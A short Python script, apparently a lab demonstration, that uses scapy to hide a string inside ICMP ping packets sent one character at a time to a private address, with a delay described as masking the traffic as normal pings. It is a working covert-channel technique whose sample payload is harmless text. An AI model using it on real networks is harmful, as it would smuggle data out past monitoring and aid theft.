# attacker_script.py
from scapy.all import IP, ICMP, send
import time

def send_icmp_covert_data(target_ip, data):
    for char in data:
        packet = IP(dst=target_ip) / ICMP(type=8) / char
        send(packet)
        time.sleep(0.1)  # slight delay to avoid flooding and mask it as a "normal" ping

if __name__ == "__main__":
    target_ip = "192.168.50.210" 
    covert_data = "Covert Channel Using ICMP"
    send_icmp_covert_data(target_ip, covert_data)
